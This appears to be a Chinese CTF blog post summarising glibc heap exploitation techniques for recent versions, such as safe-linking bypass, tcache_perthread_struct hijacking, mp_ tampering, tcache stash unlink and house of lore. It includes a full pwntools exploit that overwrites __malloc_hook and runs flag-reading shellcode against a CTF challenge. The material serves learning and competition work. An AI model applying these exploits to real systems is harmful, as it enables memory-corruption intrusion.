---
title: 高版本堆利用总结
published: 2026-03-24
description: "持续补充ing"
image: ''
tags: [PWN，heap]
category: PWN
draft: false
---

# Tcachebin

## **绕过指针保护**

```python
Chunk b 的 fd 指针存放在地址 0x555555559330
将其右移 12 位（也就是去掉最后三个十六进制位），得到 0x555555559
内存中存储的加密值为 0x55500000c7f9
0x55500000c7f9 ^ 0x0000000555555559 = 0x5555555592a0 即chunk a的数据区

Chunk a 的 fd 指针存放在地址 0x5555555592a0 右移 12 位得到 0x555555559
内存中的加密值为 0x0000000555555559
0x0000000555555559 ^ 0x0000000555555559 = 0x0000000000000000
解密结果为 0，说明 Chunk a 是这个 Tcache 链表上的最后一个块。

def protect_ptr(pos, ptr):
    """
    加密指针：用于在利用漏洞覆盖 fd 时，计算出需要写入的加密值
    :param pos: 存放该 fd 指针的内存地址 (即 堆块起始地址 + 0x10)
    :param ptr: 你真正想要 tcache 指向的目标地址 (如栈地址、__free_hook 等)
    :return: 应该写入内存的加密后数据
    """
    return (pos >> 12) ^ ptr

def reveal_ptr(pos, val):
    """
    解密指针：用于在泄露了堆内存后，还原出真实的下一跳地址
    :param pos: 存放该 fd 指针的内存地址
    :param val: 从内存中泄露/读取出的加密值
    :return: 真实的堆块物理地址
    """
    return (pos >> 12) ^ val
```

## 劫持 tcache_ptheread_struct

 tcache 引入了两个新的结构体，`tcache_entry`和 `tcache_perthread_struct`

```c
TCACHE_MAX_BINS:
# define TCACHE_MAX_BINS        64


typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];//0x40
  tcache_entry *entries[TCACHE_MAX_BINS];//0x40
} tcache_perthread_struct;

```

我们在引入了`tcache`的glibc版本中，申请第一块`chunk`时查看heap状态会发现多申请了一块大小0x250的chunk（glibc2.32+为0x290，因为`counts`的类型从char变成了uint16_t）。这个`chunk`就是 `tcache_perthread_struct`
`counts`数组存储的是各个size的`tcache bin`中的`chunk`数量，而`entries`指针数组则存放着各个size的`tcache bin`中的第一个`chunk`的`mem`地址(fd地址而非堆头地址)

我们来看一下tcache_free函数

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache
        && tc_idx < mp_.tcache_bins										//mp_.tcache_bins储存的是tcache的最大大小，修改的话可以使largebin 进入tcache
        && tcache->counts[tc_idx] < mp_.tcache_count)//<7			//mp_.tcache_count是记录tcache中的chunk数量
      {
        tcache_put (p, tc_idx);
        return;
      }
  }
#endif

```

当对应大小的tcachebin中的chunk数量小于7时，会优先放入tcachebin，然而这里检查的是`tcache->counts`数组中的元素，也就是根据`tcache_perthread_struct`中的数据来判断，但却没有检查double free

看在使用tcache时的malloc

```c
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  MAYBE_INIT_TCACHE ();
  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
```

这里是根据`tcache->entries`数组的元素来索引tcachebins中的第一个chunk，同样也是根据`tcache_perthread_struct`中的数据来判断。
所以说，如果我们能够修改`tcache_perthread_struct`中的数据，也就能控制整个tcachebins。我们可以修改counts数组的数量，以将chunk放到我们想放置的其他bins中（比如放入unsortedbin来泄露malloc_hook，libc），也可以修改entries数组的数据来malloc任意地址。



例题：SWPUCTF_2019_p1KkHeap

```c
#!/usr/bin/env python3

'''
    author: GeekCmore
    time: 2026-03-24 10:16:56
'''
from pwncli import *

filename = "SWPUCTF_2019_p1KkHeap_patched"
libcname = "/home/pwn/.config/cpwn/pkgs/2.27-3ubuntu1.2/amd64/libc6_2.27-3ubuntu1.2_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 1337
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/pwn/.config/cpwn/pkgs/2.27-3ubuntu1.2/amd64/libc6-dbg_2.27-3ubuntu1.2_amd64/usr/lib/debug
set directories /home/pwn/.config/cpwn/pkgs/2.27-3ubuntu1.2/amd64/glibc-source_2.27-3ubuntu1.2_all/usr/src/glibc/glibc-2.27
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)

def add(size):
    """
    1. Add Note
    size 最大不超过 0x100
    """
    io.recvuntil(b"Your Choice: ")
    io.sendline(b"1")
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())

def show(idx):
    """
    2. Show Note
    用于泄露地址 (Heap/Libc)
    """
    io.recvuntil(b"Your Choice: ")
    io.sendline(b"2")
    io.recvuntil(b"id: ")
    io.sendline(str(idx).encode())

def edit(idx, content):
    """
    3. Edit Note
    用于 UAF 写入，劫持 fd 指针
    """
    io.recvuntil(b"Your Choice: ")
    io.sendline(b"3")
    io.recvuntil(b"id: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"content: ")
    io.send(content)

def delete(idx):
    """
    4. Delete Note
    释放堆块（存在 UAF 漏洞）
    """
    io.recvuntil(b"Your Choice: ")
    io.sendline(b"4")
    io.recvuntil(b"id: ")
    io.sendline(str(idx).encode())

# 隐藏彩蛋 (非关键功能)
def easter_egg():
    io.recvuntil(b"Your Choice: ")
    io.sendline(b"666")

io = start()

# add(0x20)
# add(0x20)
# delete(0)
# delete(1)
# show(1)

# io.recvuntil(b"content: ")
# heap = u64(io.recv(6).ljust(8, b"\x00"))
# log.info(f"heap: {hex(heap)}")

add(0xf0)#0
delete(0)
delete(0)
show(0)

io.recvuntil(b"content: ")
heap = u64(io.recv(6).ljust(8, b"\x00")) - 0x260 + 0x10
log.info(f"heap: {hex(heap)}")

add(0xf0)#1
edit(1,p64(heap))
add(0xf0)#2
add(0xf0)#3
payload = flat([0x0707070707070707]) * 8 + flat([0,0,0,0,0,0,0x66660100])
edit(3,payload)
delete(3)
show(3)

io.recvuntil(b"content: ")
libc.address = u64(io.recv(6).ljust(8, b"\x00")) + 0x793cf280f000 - 0x793cf2bfaca0
log.info(f"libc: {hex(libc.address)}")

payload = flat([0x0101010101010101]) * 8 + flat([0,0,0,0,0,0,0x66660100,0,libc.sym['__malloc_hook']])
add(0xf0)
edit(4,payload)
add(0x70)#5
shellcode = asm(shellcraft.open('/flag')+shellcraft.read(3,heap+0x500,0x100)+shellcraft.write(1,heap+0x500,0x100))
edit(5,shellcode)

add(0x90)#6

# # show(7)
edit(6,p64(0x66660100))
gdb.attach(io)
add(0x80)



io.interactive()
```



讲解一下做题思路：

在libc 2.29之前，tcache的free是缺少对double free 的检查的，因此我们通过double free来修改 tcache fd来进行tcache poisoning来malloc到tcache_ptheread_struct，通过修改`counts[TCACHE_MAX_BINS]`来让tcache进入unsorted bin,通过修改`tcache_entry`来进行任意地址写

通过修改__malloc_hook来控制执行流到shellcode

## 修改线程 tcache 变量

在 `tls` 区域，有一个线程变量 `tcache`，如果能用 `largebin attack` 修改 `tcache` 变量，也可以控制 `tcache` 的分配。

```c
pwndbg> tls
tls : 0x7aaf512ca540

pwndbg> x/20gx 0x7aaf512ca540-0x50
0x7aaf512ca4f0: 0x0000602dc4c94010      0x0000000000000000		-->tcache_perthread_struct的指针
0x7aaf512ca500: 0x00007aaf50ffac40      0x0000000000000000
0x7aaf512ca510: 0x0000000000000000      0x0000000000000000
0x7aaf512ca520: 0x0000000000000000      0x0000000000000000
0x7aaf512ca530: 0x0000000000000000      0x0000000000000000
0x7aaf512ca540: 0x00007aaf512ca540      0x00007aaf512cae90
0x7aaf512ca550: 0x00007aaf512ca540      0x0000000000000000
0x7aaf512ca560: 0x0000000000000000      0x729d5c3ccc58ee00
0x7aaf512ca570: 0x6e9a2eb5632d2694      0x0000000000000000
0x7aaf512ca580: 0x0000000000000000      0x0000000000000000
```

因此，我们可以通过largebin attack进行对于这个指针的修改，将tcache_perthread_struct修改为我们可以控制的堆地址

## 修改 mp_结构体

相关链接:[mp_.tcache_bins基本漏洞利用 - P3troL1er 的个人博客](https://peterliuzhi.top/principle/mp_.tcache_bins基本漏洞利用/)

关注与 `tcache` 有关的几个变量：

```c
struct malloc_par
{
	//......
#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;
  size_t tcache_max_bytes;
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;
  /* Maximum number of chunks to remove from the unsorted list, which
     aren't used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
};
```

修改掉 `tcache_bins` 可以把很大的 `chunk` 用 `tcachebin` 管理；修改掉 `tcache_count` 可以控制链表的 `chunk` 的数量。`tcache_max_bytes` 目前没啥用，`tcache_unsorted_limit` 可以影响 `unsortedbin` 链表的遍历过程。

mp结构体的地址可以通过gdb调试得到

<img src="C:\Users\hua\AppData\Roaming\Typora\typora-user-images\image-20260325163422061.png" alt="image-20260325163422061" style="zoom:50%;" />

### tcache_bins

修改`tcache_bins`可以扩大tcache chunk的大小限制

1. 可以在限制`largebin`的题目下进行`tcache poisoning`

   相关例题有suctf2025 su_text		[SUCTF 2025 Writeup by 0xFFF ::](https://blog.0xfff.team/posts/suctf_2025_writeup/#su_text)

2. 当`mp_.tcache_bins`足够大的时候，我们是可以将一个大chunk放进tcache bin中的，只是由于tcache分配在堆上，这个索引值又太大，所以这个大chunk的地址（链表头）会被放进相邻的chunk中

   说简单点，tcache_bin足够大时，我们分配的大chunk进入bin时他的地址会存到相邻chunk里面 ,如果相邻的这个chunk我们可控的话，把这个地址覆盖成free_hook等,再写入我们需要的内容，比如one_gadget，system等就能getshell

### tcache_unsorted_limit

利用整理unsorted bin的机制实现在限制malloc的情况下的多次largebin attack,本身无利用方式

# fastbin

## house of corrosion

使用的范围只能在 `2.35~2.37`，进入到 `2.37` 之后，`global_max_fast` 的类型被修改为 `int8_t`，使用该技巧可以控制的地址范围大大缩小。

暂时先放一放

## Tcache Reverse Into Fastbin

### 目的

1.让任意地址进入tcache中，再取出tcache进行任意地址写。

2.对任意一个地址，写入一个可控的堆上地址。

### 条件

1.能反复创建释放14个以上的fastbin。

2.能修改其中一个fastbin的fd

3.用tcache机制

参考地址：[how2heap-fastbin_reverse_into_tcache-学习 | lexsd6's home](https://lexsd6.github.io/2022/06/17/how2heap-fastbin_reverse_into_tcache-学习/)

目前检查了对齐，所以要注意控制的地址要是 `0x?0` 结尾，否则报错。利用效果是任意地址写一个 `libc` 地址。

虽然 `0x?0` 写的是加密后的堆地址，但是 `0x?8` 会写上 `tcache_key`，这也是可以利用的点。而且，在写上地址后，还能分配到该处。其利用过程如下：

- 分配 `13` 个 `fastbin` 范围内的 `chunk`，假设大小为 `A`
- 全部释放这 `13` 个 `chunk`
- 分配 `7` 个，把 `tcachebin[A]` 耗尽
- 把 `fastbin` 最后一个 `chunk` 的 `fd` 修改为 `addr`
- 调用一次 `malloc(A)` 即可触发 `tcache reverse into fastbin`，可以分配到 `addr`，也能给 `addr/addr+8` 处写上地址 / 数

**题目：**[tcache七星剑法：轮回——Fastbin reverse into tcache - Jmp·Cliff - 博客园](https://www.cnblogs.com/JmpCliff/articles/17392759.html)

# Smallbin

## **House of Lore**

在栈上分配chunk

```c
--heap
vivtim chunk(small chunk)
bk		-->		fake chunk1

    
stack

fake_chunk2    
fd		-->fake_chunk  1  
bk		-->未定义即可    
    
fake_chunk1
fd		-->victim chunk
bk		-->fake_chunk2
```

 `house of lore` 使用的时候，一方面是需要满足 `victim->fd->bk == victim`；另一方面，需要绕过下面讲的 `tcache stash unlink` 流程。除此之外，还需要注意内存对齐的问题。

## Tcache Stash Unlink Attack

第一个技巧叫 `tcachebin stash unlinking`，下面称之为 `TSU` 技巧：

- `tcachebin[A]` 为空
- `smallbin[A]` 有 `8` 个
- 修改第 `8` 个 `smallbin chunk` 的 `bk` 为 `addr`
- 分配 `malloc(A)` 的时候，`addr+0x10` 会被写一个 `libc` 地址

第二个技巧叫 `tcachebin stash unlinking+`，下面称之为 `TSU+` 技巧：

- `tcachebin[A]` 为空
- `smallbin[A]` 有 `8` 个
- 修改第 `7` 个 `smallbin chunk` 的 `bk` 为 `addr`，还要保证 `addr+0x18` 是一个合法可写的地址
- 分配 `malloc(A)` 的时候，`addr` 会被链入到 `tcachebin`，也就是可以分配到 `addr` 处

可以看到，和 `fastbin reverse into tcache` 的攻击方法很类似，但是得到的效果不一样。`TSU` 可以在任意地址写 `libc` 地址，而 `TSU+` 除了可以写 `libc` 地址，还能再任意地址分配。

要注意的是，只要tcache还有空闲位置并且smallbin chunk数量比tcache 空闲位置多一个即可，当然还可以通过伪造fake_smallbin_chunk来增加smallbin chunk数量

# Largebin

## Largebin attack

无需多言，注意高版本的特殊条件

## House of Husk

`house of husk` 方法仍然可以利用，需要找到一个格式化字符串的场景，且打 `house of husk` 的时候，至少需要两次格式化字符串。

学习链接：

[house-of-husk学习笔记](https://www.anquanke.com/post/id/202387)

[House of Husk - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507#House-of-Husk)

## Libc/Ld 上的变量

`libc/ld` 的地址空间上关键变量非常多，比如`_IO_list_all`，`pointer_guard`、`tcache` 等等。





